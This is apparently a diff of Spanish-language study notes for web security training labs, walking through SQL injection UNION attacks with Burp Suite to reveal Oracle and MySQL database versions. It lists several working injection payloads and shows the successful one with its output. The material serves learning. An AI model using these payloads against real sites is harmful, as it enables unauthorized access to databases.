@@ -1,5 +1,4 @@
 
-
 EXAMINING THE DATA BASE
 
 
@@ -14,7 +13,7 @@ Se puede usar el UNION attack para explotar la vulnerabilidad
 End gol: Saber la version de la base de datos que se esta usando. 
 
 
--> Analisis de la maquina: 
+-> ejecutando el ataque a la maquina: 
 
 1) con burpsuite y fox proxy, vamos a la URL: https://0a78008804a222f980b3807400a300e0.web-security-academy.net/filter?category=Pets
 
@@ -37,4 +36,52 @@ Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
 PL/SQL Release 11.2.0.2.0 - Production
 TNS for Linux: Version 11.2.0.2.0 - Production
 
+
+
+
+			--> Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+			
+
+-> Reconocimiento & Objectivo :
+
+Vulnerabilidad en el "product category offer" 
+Podemos usar Union attack, para obtener resultados desde un query inyectado 
+para RESOLVER el lab tenemos que mostrar la version de la base de datos.
+
+
+-> ejecutando el ataque a la maquina:
+
+1) con burp suite y fox proyx vamos a la URL: https://0aaa00c504c0673f81d8436800d90052.web-security-academy.net/
+
+2) encendemos el capturador de burp suite app y fox proxy en el navegador.  
+
+3) Click en la category de "pets" (damos click en forward en burpsuite hasta finalizar la carga de la pagina) 
+
+4) en burp suite > proxy > http history > click en la peticion que contenga la url "/filter?category=Pets , click derecho y "send to repeter" 
+
+5) en el repetir en la primera linea esta: GET /filter?category=Pets HTTP/1.1 cambiar la url por: GET /filter?category=' HTTP/1.1 ( si devuelve un error 500, es probable que la pagina sea vulnerable a SQL injection )
+
+6) Apesar de intentar ver cuantas columanas retornaba la base datos usando los comandos: 
+'+UNION+SELECT+NULL--+
+'+UNION+SELECT+NULL,NULL--+
+'+UNION+SELECT+NULL,NULL,NULL--+
+Nada funciono. Procedemos a continuar con el siguiente paso:  
+
+7) La pagina parece vulnerable a SQL, usaremos varios payloads para ver la version de base de datos
+' UNION SELECT banner FROM v$version-- ==> '+UNION+SELECT+banner+FROM+v$version--
+' UNION SELECT version FROM v$instance-- ==> '+UNION+SELECT+version+FROM+v$instance--
+' UNION SELECT @@version--  ==>  '+UNION+SELECT+%40%40version--+
+' UNION SELECT version()--  ==> '+UNION+SELECT+version()--
+' UNION SELECT version FROM dual--
+
+Nada funciona excepto este codigo: 
+
+'+UNION+SELECT+@@version,NULL--+
+
+Este query utiliza la función @@version para obtener la versión de la base de datos. La segunda columna tiene un valor NULL para asegurarse de que el query tiene el mismo número de columnas que la consulta original.
+
+
+--> Output: 
+
+RESPUESTA: '+UNION+SELECT+@@version,NULL--+  ==> 8.0.32-0ubuntu0.20.04.2
 
